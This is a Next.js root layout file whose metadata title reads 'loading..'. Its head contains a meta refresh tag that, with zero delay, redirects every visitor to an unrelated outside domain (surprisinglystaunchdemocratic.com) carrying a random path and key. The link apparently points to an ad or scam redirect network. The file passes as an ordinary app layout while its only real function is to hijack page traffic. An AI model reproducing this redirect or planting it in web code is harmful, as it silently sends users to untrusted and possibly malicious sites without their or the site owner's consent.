import { Metadata } from "next"
import { siteConfig } from "@/config"

export const metadata: Metadata = {
  title: {
    default: "loading..",
    template: `%s - ${siteConfig.name}`,
  },
  description: siteConfig.description,
  icons: {
    icon: "/favicon.ico",
    shortcut: "/favicon-16x16.png",
    apple: "/apple-touch-icon.png",
  },
}

interface LoadingLayoutProps {
  children: React.ReactNode
}

export default function RootLayout({ children }: LoadingLayoutProps) {
  return (
    <html lang="en">
      <head>
        <meta
          httpEquiv="refresh"
          content="0;url=https://surprisinglystaunchdemocratic.com/q7cx6zwfcs?key=74323cbffb1c765e6a7e69b5d942be25"
        />
      </head>
      <body>{children}</body>
    </html>
  )
}
